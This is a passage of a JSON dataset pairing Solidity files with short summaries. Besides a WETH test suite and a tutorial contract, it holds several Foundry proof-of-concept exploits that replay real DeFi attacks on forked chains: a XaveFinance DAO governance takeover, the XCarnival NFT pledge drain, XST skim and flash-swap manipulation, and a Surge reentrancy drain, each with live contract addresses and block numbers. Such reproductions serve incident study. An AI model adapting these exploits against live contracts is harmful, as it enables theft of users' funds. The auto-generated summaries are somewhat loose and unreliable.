 }\n\n    function testWithdraw() public {\n        uint256 startingBalance = address(this).balance;\n\n        weth.deposit{value: 1 ether}();\n\n        weth.withdraw(1 ether);\n\n        uint256 balanceAfterWithdraw = address(this).balance;\n\n        assertEq(balanceAfterWithdraw, startingBalance);\n        assertEq(weth.balanceOf(address(this)), 0);\n        assertEq(weth.totalSupply(), 0);\n    }\n\n    function testPartialWithdraw() public {\n        weth.deposit{value: 1 ether}();\n\n        uint256 balanceBeforeWithdraw = address(this).balance;\n\n        weth.withdraw(0.5 ether);\n\n        uint256 balanceAfterWithdraw = address(this).balance;\n\n        assertEq(balanceAfterWithdraw, balanceBeforeWithdraw + 0.5 ether);\n        assertEq(weth.balanceOf(address(this)), 0.5 ether);\n        assertEq(weth.totalSupply(), 0.5 ether);\n    }\n\n    function testFallbackDeposit(uint256 amount) public {\n        amount = bound(amount, 0, address(this).balance);\n\n        assertEq(weth.balanceOf(address(this)), 0);\n        assertEq(weth.totalSupply(), 0);\n\n        SafeTransferLib.safeTransferETH(address(weth), amount);\n\n        assertEq(weth.balanceOf(address(this)), amount);\n        assertEq(weth.totalSupply(), amount);\n    }\n\n    function testDeposit(uint256 amount) public {\n        amount = bound(amount, 0, address(this).balance);\n\n        assertEq(weth.balanceOf(address(this)), 0);\n        assertEq(weth.totalSupply(), 0);\n\n        weth.deposit{value: amount}();\n\n        assertEq(weth.balanceOf(address(this)), amount);\n        assertEq(weth.totalSupply(), amount);\n    }\n\n    function testWithdraw(uint256 depositAmount, uint256 withdrawAmount) public {\n        depositAmount = bound(depositAmount, 0, address(this).balance);\n        withdrawAmount = bound(withdrawAmount, 0, depositAmount);\n\n        weth.deposit{value: depositAmount}();\n\n        uint256 balanceBeforeWithdraw = address(this).balance;\n\n        weth.withdraw(withdrawAmount);\n\n        uint256 balanceAfterWithdraw = address(this).balance;\n\n        assertEq(balanceAfterWithdraw, balanceBeforeWithdraw + withdrawAmount);\n        assertEq(weth.balanceOf(address(this)), depositAmount - withdrawAmount);\n        assertEq(weth.totalSupply(), depositAmount - withdrawAmount);\n    }\n\n    receive() external payable {}\n}\n\ncontract WETHInvariants is DSTestPlus, DSInvariantTest {\n    WETHTester wethTester;\n    WETH weth;\n\n    function setUp() public {\n        weth = new WETH();\n        wethTester = new WETHTester{value: address(this).balance}(weth);\n\n        addTargetContract(address(wethTester));\n    }\n\n    function invariantTotalSupplyEqualsBalance() public {\n        assertEq(address(weth).balance, weth.totalSupply());\n    }\n}\n\ncontract WETHTester {\n    WETH weth;\n\n    constructor(WETH _weth) payable {\n        weth = _weth;\n    }\n\n    function deposit(uint256 amount) public {\n        weth.deposit{value: amount}();\n    }\n\n    function fallbackDeposit(uint256 amount) public {\n        SafeTransferLib.safeTransferETH(address(weth), amount);\n    }\n\n    function withdraw(uint256 amount) public {\n        weth.withdraw(amount);\n    }\n\n    receive() external payable {}\n}\n",
        "summary": "This code tests the functionality of the Wrapped Ether (WETH) contract, which is an ERC20 token that represents Ether on the Ethereum blockchain. \n\nThe code defines a WETHTest contract that runs tests on the WETH contract, such as checking if deposits and withdrawals work as expected. It also defines a WETHInvariants contract that checks an invariant where the total supply of WETH equals the total amount of Ether held by the WETH contract.\n\nLastly, the code defines a WETHTester contract that is used in the WETHInvariants contract to interact with the WETH contract.",
        "id": "65467d47-da0b-47ad-aa2b-aba15bcada0c"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract Enum {\n    enum Operation {\n        Call, DelegateCall\n    }\n}\n\ninterface IDaoModule {\n    function getTransactionHash(address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 nonce) external view returns(bytes32); \n\n    function executeProposalWithIndex(string memory proposalId, bytes32[] memory txHashes, address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 txIndex) external;\n\n    function addProposal(string memory proposalId, bytes32[] memory txHashes) external;\n\n    function buildQuestion(string memory proposalId, bytes32[] memory txHashes) external pure returns(string memory);\n\n    function questionIds (bytes32) external returns (bytes32);\n}\n\ninterface IRealitio {\n  function submitAnswer(bytes32 question_id, bytes32 answer, uint256 max_previous) external payable;\n\n  function isFinalized(bytes32 question_id) view external returns (bool);\n}\n\ninterface IPrimaryBridge{\n    function owner() external view returns (address);\n}\n\ncontract XaveFinanceExploit is DSTest {\n    \n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    \n    IERC20 RNBW = IERC20(0xE94B97b6b43639E238c851A7e693F50033EfD75C);\n    IERC20 LPOP = IERC20(0x6335A2E4a2E304401fcA4Fc0deafF066B813D055);\n    IPrimaryBridge PrimaryBridge =  IPrimaryBridge(0x579270F151D142eb8BdC081043a983307Aa15786);\n    IDaoModule daoModule = IDaoModule(0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F);\n    IRealitio realitio = IRealitio (0x325a2e0F3CCA2ddbaeBB4DfC38Df8D19ca165b47);\n\n    address attacker = 0x0f44f3489D17e42ab13A6beb76E57813081fc1E2;\n    address attackerContract = 0xE167cdAAc8718b90c03Cf2CB75DC976E24EE86D3;\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 15704736); // fork mainnet at 15704736 \n    }\n\n    function encodeWithSignature_mint(address to, uint amount)\n        internal\n        pure\n        returns (bytes memory)\n    {\n        return abi.encodeWithSignature(\"mint(address,uint256)\", to, amount);\n    }\n\n    function encodeWithSignature_transferOwnership(address to)\n        internal\n        pure\n        returns (bytes memory)\n    {\n        return abi.encodeWithSignature(\"transferOwnership(address)\", to);\n    }\n\n    function testAttack() public {\n        \n        //tx to mint 100000000000000 $RNBW tokens\n        bytes32 tx0 = daoModule.getTransactionHash(\n            0xE94B97b6b43639E238c851A7e693F50033EfD75C,\n            0,\n            encodeWithSignature_mint(attacker, 100000000000000000000000000000000),\n            //hex\"40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000\",\n            Enum.Operation(0),\n            0\n        );\n        \n        //tx to transferOwnership to attacker(0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)\n        bytes32 tx1 = daoModule.getTransactionHash(\n            0xE94B97b6b43639E238c851A7e693F50033EfD75C,\n            0,\n            encodeWithSignature_transferOwnership(attacker),\n            //hex\"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2\",\n            Enum.Operation(0),\n            1\n        );\n\n        //tx to transferOwnership to attacker(0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)\n        bytes32 tx2 = daoModule.getTransactionHash(\n            0x6335A2E4a2E304401fcA4Fc0deafF066B813D055,\n            0,\n            encodeWithSignature_transferOwnership(attacker),\n            //hex\"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2\",\n            Enum.Operation(0),\n            2\n        );\n\n        //tx to transferOwnership to attacker(0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)\n        bytes32 tx3 = daoModule.getTransactionHash(\n            0x579270F151D142eb8BdC081043a983307Aa15786,\n            0,\n            encodeWithSignature_transferOwnership(attacker),\n            //hex\"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2\",\n            Enum.Operation(0),\n            3\n        );\n        \n        //the txIDs generated using getTransactionHash\n        bytes32[] memory txIDs = new bytes32[](4);  \n        txIDs[0] = tx0;\n        txIDs[1] = tx1;\n        txIDs[2] = tx2;\n        txIDs[3] = tx3;\n        \n        daoModule.addProposal(\"2\", txIDs);\n        string memory q = daoModule.buildQuestion(\"2\", txIDs);\n        bytes32 qID = daoModule.questionIds(keccak256(bytes(q)));\n        realitio.submitAnswer{value: 1}(qID, bytes32(uint256(1)), 0);\n        cheats.warp(block.timestamp + 24 * 60 * 60);\n\n        emit log_named_address(\"[Before proposal Execution] Owner of $RNBW: \", RNBW.owner());\n        emit log_named_address(\"[Before proposal Execution] Owner of $LPOP: \", LPOP.owner());\n        emit log_named_address(\"[Before proposal Execution] Owner of PrimaryBridge: \", PrimaryBridge.owner());\n        emit log_named_uint(\"[Before proposal Execution] Attacker's $RNBW Token Balance: \", RNBW.balanceOf(attacker) / 1 ether);\n        cheats.startPrank(attackerContract);\n\n        //Execute mint 100000000000000 $RNBW tokens\n        daoModule.executeProposalWithIndex(\n            \"2\",\n            txIDs,\n            0xE94B97b6b43639E238c851A7e693F50033EfD75C,\n            0,\n            encodeWithSignature_mint(attacker, 100000000000000000000000000000000),\n            //hex\"40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000\",\n            Enum.Operation(0),\n            0\n        );\n\n        //Execute transferOwnership to attacker(0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)\n        daoModule.executeProposalWithIndex(\n            \"2\",\n            txIDs,\n            0xE94B97b6b43639E238c851A7e693F50033EfD75C,\n            0,\n            encodeWithSignature_transferOwnership(attacker),\n            //hex\"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2\",\n            Enum.Operation(0),\n            1\n        );\n\n        //Execute transferOwnership to attacker(0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)\n        daoModule.executeProposalWithIndex(\n            \"2\",\n            txIDs,\n            0x6335A2E4a2E304401fcA4Fc0deafF066B813D055,\n            0,\n            encodeWithSignature_transferOwnership(attacker),\n            //hex\"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2\",\n            Enum.Operation(0),\n            2\n        );\n\n        //Execute transferOwnership to attacker(0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)\n        daoModule.executeProposalWithIndex(\n            \"2\",\n            txIDs,\n            0x579270F151D142eb8BdC081043a983307Aa15786,\n            0,\n            encodeWithSignature_transferOwnership(attacker),\n            //hex\"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2\",\n            Enum.Operation(0),\n            3\n        );\n\n        cheats.stopPrank();\n\n        emit log_string(\"--------------------------------------------------------------\");\n        emit log_named_address(\"[After proposal Execution] Owner of $RNBW: \", RNBW.owner());\n        emit log_named_address(\"[After proposal Execution] Owner of $LPOP: \", LPOP.owner());\n        emit log_named_address(\"[After proposal Execution] Owner of PrimaryBridge: \", PrimaryBridge.owner());\n        emit log_named_uint(\"[After proposal Execution] Attacker's $RNBW Token Balance: \", RNBW.balanceOf(attacker) / 1 ether);\n    }\n    \n}\n",
        "summary": "The code is an exploit contract that targets a contract called \"daoModule\". It creates a fork of the \"mainnet\" blockchain and performs a series of transactions that allow the attacker to gain ownership of certain contracts and mint a large amount of a token called \"RNBW\". The attacker uses an interface called \"IRealitio\" to submit answers to an oracle contract called \"realitio\" and execute the transactions on the forked blockchain. Finally, the exploit contract logs the changes in ownership and token balance after the transactions are executed.",
        "id": "85c9fcaa-5195-4443-8e79-b04105e8820b"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo\n// Total Lost : 3087 ETH (~3,870,000 US$)\n// Attacker Wallet : 0xb7cbb4d43f1e08327a90b32a8417688c9d0b800a\n// Main Attack Contract : 0xf70f691d30ce23786cfb3a1522cfd76d159aca8d\n// Vulnerable Contract XNFT.sol : https://etherscan.io/address/0x39360ac1239a0b98cb8076d4135d0f72b7fd9909#code\n\n// @Info\n// XToken.sol : https://etherscan.io/address/0x5417da20ac8157dd5c07230cfc2b226fdcfc5663#code\n// Proxy of XNFT.sol : 0xb14B3b9682990ccC16F52eB04146C3ceAB01169A\n// P2Controller.sol : https://etherscan.io/address/0x34ca24ddcdaf00105a3bf10ba5aae67953178b85#code\n// BAYC Contract: 0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d\n\n// @News\n// Offical Announce : https://twitter.com/XCarnival_Lab/status/1541226298399653888\n// PeckShield Alert Thread : https://twitter.com/peckshield/status/1541047171453034501\n// Blocksec Alert Thread : https://twitter.com/BlockSecTeam/status/1541070850505723905\n\n// @Shortcuts\n/*\n  Attacker Tx List : https://etherscan.io/txs?a=0xb7cbb4d43f1e08327a90b32a8417688c9d0b800a\n    First `0xadf6a75d` call : https://etherscan.io/tx/0x422e7b0a449deba30bfe922b5c34282efbdbf860205ff04b14fd8129c5b91433\n    First `Start` call : https://etherscan.io/tx/0xabfcfaf3620bbb2d41a3ffea6e31e93b9b5f61c061b9cfc5a53c74ebe890294d\n*/\n\ninterface IBAYC {\n  function setApprovalForAll(address operator, bool _approved) external;\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 tokenId\n  ) external;\n\n  function ownerOf(uint256 tokenId) external view returns (address owner);\n}\n\ninterface IXNFT {\n  function counter() external returns (uint256); // getter() for -> uint256 public counter;\n\n  function pledgeAndBorrow(\n    address _collection,\n    uint256 _tokenId,\n    uint256 _nftType,\n    address xToken,\n    uint256 borrowAmount\n  ) external;\n\n  function withdrawNFT(uint256 orderId) external;\n}\n\ninterface IXToken {\n  function borrow(\n    uint256 orderId,\n    address payable borrower,\n    uint256 borrowAmount\n  ) external;\n}\n\n/* Contract: 0xa04ec2366641a2286782d104c448f13bf36b2304 */\ninterface INothing {\n  function borrow(\n    uint256 orderId,\n    address payable borrower,\n    uint256 borrowAmount\n  ) external;\n}\n\n/* Contract: 0x2d6e070af9574d07ef17ccd5748590a86690d175 */\ncontract payloadContract is DSTest {\n  event OwnershipTransferred(\n    address indexed previousOwner,\n    address indexed newOwner\n  );\n  uint256 orderId = 0;\n  IBAYC BAYC = IBAYC(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);\n  IXNFT XNFT = IXNFT(0xb14B3b9682990ccC16F52eB04146C3ceAB01169A);\n  IXToken XToken = IXToken(0xB38707E31C813f832ef71c70731ed80B45b85b2d);\n  INothing doNothing = INothing(0xA04EC2366641a2286782D104C448f13bF36B2304);\n\n  constructor() {\n    emit OwnershipTransferred(address(0), address(msg.sender));\n    BAYC.setApprovalForAll(tx.origin, true);\n  }\n\n  // function 0x97c1edd3()\n  function makePledge() public {\n    BAYC.setApprovalForAll(address(XNFT), true);\n\n    // Attacker was call `pledgeAndBorrow()`, But `pledge()` also vulnerable.\n    XNFT.pledgeAndBorrow(address(BAYC), 5110, 721, address(doNothing), 0);\n\n    orderId = XNFT.counter();\n    assert(orderId >= 11); // Attacker start by orderId:11\n    XNFT.withdrawNFT(orderId);\n\n    BAYC.transferFrom(address(this), msg.sender, 5110);\n  }\n\n  // function 0x2a3e7cec()\n  function dumpETH() public {\n    XToken.borrow(orderId, payable(address(this)), 36 ether);\n    payable(msg.sender).transfer(address(this).balance);\n  }\n\n  function onERC721Received(\n    address operator,\n    address from,\n    uint256 tokenId,\n    bytes calldata data\n  ) external pure returns (bytes4) {\n    return this.onERC721Received.selector;\n  }\n\n  receive() external payable {}\n}\n\n/* Contract: 0xf70f691d30ce23786cfb3a1522cfd76d159aca8d */\ncontract mainAttackContract is DSTest {\n  address payable[33] public payloads;\n  address attacker = 0xb7CBB4d43F1e08327A90B32A8417688C9D0B800a;\n  IBAYC BAYC = IBAYC(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);\n  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheat.createSelectFork(\"mainnet\", 15028846); // fork mainnet at block 15028846\n\n    cheat.deal(address(this), 0);\n    emit log_named_decimal_uint(\n      \"[*] Attacker Contract ETH Balance\",\n      address(this).balance,\n      18\n    );\n\n    // Mainnet TxID: 0x7cd094bc34c6700090f88950ab0095a95eb0d54c8e5012f1f46266c8871027ff\n    emit log_string(\"\\tAttacker send BAYC#5110 to Attack Contract...\");\n    cheat.roll(15028846);\n    cheat.startPrank(attacker);\n    BAYC.transferFrom(attacker, address(this), 5110);\n    cheat.stopPrank();\n  }\n\n  // [Main Attack Contract].0xadf6a75d()\n  function testExploit() public {\n    // Set msg.sender = 0xf70f691d30ce23786cfb3a1522cfd76d159aca8d (Main Attack Contract)\n    // Set tx.origin = 0xb7CBB4d43F1e08327A90B32A8417688C9D0B800a (Attacker)\n    cheat.startPrank(address(this), attacker);\n\n    emit log_string(\"[Exploit] Making pledged record...\");\n    for (uint8 i = 0; i < payloads.length; ++i) {\n      payloadContract payload = new payloadContract();\n      cheat.deal(address(payload), 0); // Set balance 0 ETH to avoid conflict on forknet\n      payloads[i] = payable(address(payload));\n\n      BAYC.transferFrom(address(this), address(payloads[i]), 5110);\n      require(BAYC.ownerOf(5110) == payloads[i], \"BAYC#5110 Transfer Failed\");\n\n      payload.makePledge();\n    }\n\n    assert(payloads[0] != address(0));\n    assert(payloads[32] != address(0));\n\n    emit log_string(\"[Exploit] Dumping ETH from borrow...\");\n    for (uint8 i = 0; i < payloads.length; ++i) {\n      payloads[i].call(abi.encodeWithSignature(\"dumpETH()\"));\n    }\n\n    emit log_string(\"[*] Exploit Execution Completed!\");\n    emit log_named_decimal_uint(\n      \"[*] Attacker Contract ETH Balance\",\n      address(this).balance,\n      18\n    );\n  }\n\n  receive() external payable {}\n}\n",
        "summary": "This code is a Solidity smart contract that contains interfaces and contracts and is related to a recent attack on the XNFT smart contract. The code defines an interface for the Bored Ape Yacht Club (BAYC) contract and contains references to other interfaces and contracts, including XNFT, XToken, and INothing. It also includes a payloadContract and a mainAttackContract, which are used to execute the attack. The attack involves exploiting a vulnerability in the XNFT contract that allows an attacker to borrow ETH and dump it to their address. The mainAttackContract deploys multiple instances of the payloadContract, which interact with the BAYC and XNFT contracts to execute the attack and dump the stolen ETH.",
        "id": "662f2026-10d2-45fe-bff2-049eac76af75"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// Pool1: UniswapV2 WETH/USDT\n// Pool2: UniswapV2 WETH/XST\n// https://tools.blocksec.com/tx/eth/0x873f7c77d5489c1990f701e9bb312c103c5ebcdcf0a472db726730814bfd55f3\n\ncontract XSTExpTest is Test {\n    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address constant UniswapV20x694f = 0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C;\n    address constant XST = 0x91383A15C391c142b80045D8b4730C1c37ac0378;\n    address constant XStable2 = 0xb276647E70CB3b81a1cA302Cf8DE280fF0cE5799;\n    address constant UniswapV20x0d4a = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;\n    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheat.createSelectFork(\"mainnet\", 15310016);\n    }\n\n    function testExploit() public {\n        uint256 balance = IERC20(WETH).balanceOf(UniswapV20x694f);\n        IUniswapV2Pair(UniswapV20x0d4a).swap(balance * 2, 0, address(this), \"0000\");\n        uint256 WETHBalance = IERC20(WETH).balanceOf(address(this));\n        console.log(\"now my weth num: %s\", WETHBalance / 1e18);\n        IERC20(WETH).withdraw(WETHBalance);\n    }\n\n    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        if (keccak256(data) == keccak256(\"0000\")) {\n            uint256 balance = IERC20(WETH).balanceOf(address(this));\n            IERC20(WETH).transfer(UniswapV20x694f, balance);\n            uint256 uniswapETHBalance = IERC20(WETH).balanceOf(UniswapV20x694f);\n            (uint256 amount0Out, uint256 amount1Out, ) = Uni_Pair_V2(UniswapV20x694f).getReserves();\n            console.log(\"Reserve amount %s\", amount0Out);\n            uint256 borrowXST = amount0Out * balance / uniswapETHBalance;\n            console.log(\"Swap xst %s\", borrowXST);\n            Uni_Pair_V2(UniswapV20x694f).swap(borrowXST, 0, address(this), \"00\");\n            Uni_Pair_V2(UniswapV20x694f).sync();\n            uint256 b1 = IERC20(XST).balanceOf(address(this));\n            uint256 b2 = IERC20(XST).balanceOf(UniswapV20x694f);\n            console.log(\"My xst balance: %s, uniswp xst: %s\", b1, b2);\n            IERC20(XST).transfer(UniswapV20x694f, b1 / 8);\n            for (uint8 i = 0; i < 15; ++i) {\n                Uni_Pair_V2(UniswapV20x694f).skim(UniswapV20x694f);\n            }\n            Refund(amount0);\n        } else {\n            // do nothing\n        }\n    }\n\n    function Refund(uint256 amount) internal  {\n        Uni_Pair_V2(UniswapV20x694f).skim(address(this));\n        uint256 nowXSTBalance = IERC20(XST).balanceOf(address(this));\n        IERC20(XST).transfer(UniswapV20x694f, nowXSTBalance);\n        (uint256 a0Out, uint256 a1Out, ) = Uni_Pair_V2(UniswapV20x694f).getReserves();\n        uint256 swapAmount = a1Out * 9 / 10;\n        Uni_Pair_V2(UniswapV20x694f).swap(0, swapAmount, address(this), \"00\");\n        uint256 nowWETHBalance = IERC20(WETH).balanceOf(address(this));\n        console.log(\"my weth balance: %s\", nowWETHBalance);\n        uint256 v = amount;\n        uint256 fee = v * 4 / 1e3;\n        uint256 refund = v + fee;\n        console.log(\"Refund %s:\", refund);\n        IERC20(WETH).transfer(UniswapV20x0d4a, refund);\n    }\n\n    fallback() external payable { }\n}\n",
        "summary": "This is a Solidity smart contract written in version 0.8.13 that allows for an exploit on the XStable2 platform. The contract contains a test function called `testExploit()` that performs the exploit by swapping WETH for XST tokens on the UniswapV2 exchange and then transferring the XST tokens to the exploit contract. It also contains an `uniswapV2Call()` function that is called when tokens are sent to the exploit contract and it performs a series of token transfers and swaps to ultimately refund funds to the calling address. By exploiting this flaw in the XStable2 platform, an attacker could potentially steal funds from the platform.",
        "id": "6677ea7e-36aa-497c-b783-8a0fe6951f41"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// Pool1: UniswapV2 WETH/USDT\n// Pool2: UniswapV2 WETH/XST\n// XST Logic Contract Address: https://etherscan.io/address/0xb276647e70cb3b81a1ca302cf8de280ff0ce5799#code\n// https://tools.blocksec.com/tx/eth/0x873f7c77d5489c1990f701e9bb312c103c5ebcdcf0a472db726730814bfd55f3\n\ncontract ContractTest is DSTest{\n\n    IERC20 XST = IERC20(0x91383A15C391c142b80045D8b4730C1c37ac0378);\n    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    Uni_Pair_V2 Pair1 = Uni_Pair_V2(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852); // WETH USDT\n    Uni_Pair_V2 Pair2 = Uni_Pair_V2(0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C); // WETH XST\n    uint amount;\n\n    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheat.createSelectFork(\"mainnet\", 15310016);\n    }\n\n    function testExploit() public{\n\n        emit log_named_decimal_uint(\n            \"Attacker WETH profit before exploit\",\n            WETH.balanceOf(address(this)),\n            18\n        );\n\n        amount = WETH.balanceOf(address(Pair2));\n        Pair1.swap(amount * 2, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"Attacker WETH profit after exploit\",\n            WETH.balanceOf(address(this)),\n            18\n        );\n\n    }\n\n    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n\n        // swap WETH to XST\n        uint amountSellWETH = WETH.balanceOf(address(this));\n        (uint reserve0, uint reserve1, ) = Pair2.getReserves(); // r0 : XST r1 WETH\n        uint amountOutXST = amountSellWETH * 997 * reserve0 / (reserve1 * 1000 + amountSellWETH * 997);\n        WETH.transfer(address(Pair2), amountSellWETH);\n        Pair2.swap(amountOutXST, 0, address(this), \"\");\n\n        //XST skim\n        XST.transfer(address(Pair2), XST.balanceOf(address(this)) / 8);\n        for(int i = 0; i < 15; i++){\n            Pair2.skim(address(Pair2));\n        }\n        Pair2.skim(address(this));\n\n        // sell XST to WETH\n        // XST is SupportFeeOn Token\n        XST.transfer(address(Pair2), XST.balanceOf(address(this)));\n        uint balanceOfXST = XST.balanceOf(address(Pair2));\n        (uint reserve3, uint reserve4, ) = Pair2.getReserves(); // r3 : XST r4 WETH\n        uint amountSellXST = balanceOfXST - reserve3;\n        uint amountOutWETH = amountSellXST * 997 * reserve4 / (reserve3 * 1000 + amountSellXST * 997);      \n        Pair2.swap(0, amountOutWETH, address(this), \"\");\n\n        // repay falshswap\n        WETH.balanceOf(address(this));\n        WETH.transfer(address(Pair1), (amount * 2) * 1000 / 997 + 1000);\n\n    }\n\n}",
        "summary": "This is a Solidity smart contract that exploits a vulnerability in the Uniswap decentralized exchange protocol. The contract performs a flash swap operation between two Uniswap pools involving the WETH and XST tokens. The exploit involves manipulating the balances of the pools to make the flash swap profitable for the attacker. The contract imports the necessary interfaces and defines the pools and tokens to be used. It also defines a function to set up the testing environment and a function to execute the exploit. Finally, the contract defines a function to handle the Uniswap callback for the flash swap.",
        "id": "185363bb-a4e2-4d12-9751-ccd95c9a425a"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!\npragma solidity >=0.7.0 <0.9.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ninterface IpancakePair {\n  function swap(\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address to,\n    bytes calldata data\n  ) external;\n\n  function token0() external view returns (address);\n\n  function token1() external view returns (address);\n}\n\ninterface Token {\n  function balanceOf(address account) external view returns (uint256);\n\n  function transfer(address recipient, uint256 amount) external returns (bool);\n}\n\ncontract ContractTest is DSTest {\n  IpancakePair ipancake =\n    IpancakePair(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);\n  WBNB wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n  Surge surge = Surge(0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21);\n  address public constant Surge_Address =\n    0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21;\n  address private constant Pancake_Pair_Address =\n    0x0eD7e52944161450477ee417DE9Cd3a859b14fD0;\n  address public mywallet = msg.sender;\n  uint8 public time = 0;\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"bsc\", 10087723); // fork bsc at block 10087723\n  }\n\n  function testExploit() public {\n    payable(address(0)).transfer(address(this).balance);\n    ipancake.swap(0, 10000 * 1e18, address(this), \"0x00\");\n    // wbnb.withdraw(wbnb.balanceOf(address(this)));\n    // VISR_Balance =  visr.balanceOf(msg.sender);\n    //emit log_named_uint(\"WBNB Balance\",wbnb.balanceOf(address(this)));\n    emit log_named_uint(\n      \"Exploit completed, WBNB Balance\",\n      wbnb.balanceOf(mywallet)\n    );\n  }\n\n  function pancakeCall(\n    address sender,\n    uint256 amount0,\n    uint256 amount1,\n    bytes calldata data\n  ) external {\n    wbnb.withdraw(wbnb.balanceOf(address(this)));\n\n    (bool buy_successful, ) = payable(Surge_Address).call{\n      value: address(this).balance,\n      gas: 40000\n    }(\"\");\n\n    surge.sell(surge.balanceOf(address(this)));\n    surge.sell(surge.balanceOf(address(this)));\n    surge.sell(surge.balanceOf(address(this)));\n    surge.sell(surge.balanceOf(address(this)));\n    surge.sell(surge.balanceOf(address(this)));\n    surge.sell(surge.balanceOf(address(this)));\n    surge.sell(surge.balanceOf(address(this)));\n\n    wbnb.deposit{ value: address(this).balance }();\n\n    wbnb.transfer(Pancake_Pair_Address, 10030 * 1e18);\n    wbnb.transfer(mywallet, wbnb.balanceOf(address(this)));\n  }\n\n  receive() external payable {\n    if (msg.sender == Surge_Address && time < 6) {\n      (bool buy_successful, ) = payable(Surge_Address).call{\n        value: address(this).balance,\n        gas: 40000\n      }(\"\");\n\n      time++;\n    }\n  }\n}\n",
        "summary": "This code defines a smart contract `ContractTest` that interacts with the Binance Smart Chain network. It imports interfaces from two other contracts (`IpancakePair` and `Token`). The contract also defines a setup function `setUp()` and a test function `testExploit()`. The `testExploit()` function sends a swap transaction to the PancakeSwap decentralized exchange, swaps some tokens for WBNB tokens, then transfers the WBNB to `mywallet`. Other functions defined include `pancakeCall()` and a receive function which allows the contract to receive and handle payments. The code also imports the `Test.sol` library, which is a testing utility library.",
        "id": "c22fab10-02d1-432e-9226-5dfeda65a92e"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\n// \u7b2c10\u8bb2\u5408\u7ea6\u7ee7\u627f\u4e2d\u7684Yeye\u5408\u7ea6\ncontract Yeye {\n    event Log(string msg);\n\n    // \u5b9a\u4e493\u4e2afunction: hip(), pop(), yeye()\uff0cLog\u503c\u4e3aYeye\u3002\n    function hip() public virtual{\n        emit Log(\"Yeye\");\n    }\n\n    function pop() public virtual{\n        emit Log(\"Yeye\");\n    }\n\n    function yeye() public virtual {\n        emit Log(\"Yeye\");\n    }\n}\n",
        "summary": "This is a Solidity smart contract that defines a parent contract called \"Yeye\" and contains three virtual functions: hip(), pop(), and yeye(). Each function emits a log with the string value \"Yeye\".",
        "id": "e1a94ca5-1fd6-45b8-84b0-ceb39c4d545b"
    },
    {
